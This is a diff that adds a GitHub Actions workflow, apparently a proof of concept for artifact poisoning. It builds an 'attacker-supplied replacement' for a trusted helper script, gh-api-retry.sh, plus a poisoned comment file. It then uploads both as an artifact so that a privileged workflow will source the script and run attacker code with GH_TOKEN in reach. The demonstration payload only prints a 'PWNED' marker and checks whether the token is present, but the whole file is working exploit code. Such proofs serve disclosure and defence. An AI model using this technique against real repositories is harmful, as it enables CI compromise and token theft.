@@ -1,0 +1,25 @@
+name: velox-shape-artifact
+on: [workflow_dispatch]
+permissions: {}
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build velox-shaped poisoned artifact (no traversal needed)
+        run: |
+          mkdir -p .github/scripts
+          cat > .github/scripts/gh-api-retry.sh <<'SH'
+          # attacker-supplied replacement for the trusted helper
+          echo "PWNED: attacker shell code executing via 'source'"
+          echo "GH_TOKEN available to this shell: ${GH_TOKEN:+yes}"
+          gh_api() { echo ""; }
+          SH
+          echo "poisoned comment body" > comment.md
+      - uses: actions/upload-artifact@v4
+        with:
+          name: selective-build-comment
+          path: |
+            .github/scripts/gh-api-retry.sh
+            comment.md
+          include-hidden-files: true
+          retention-days: 30
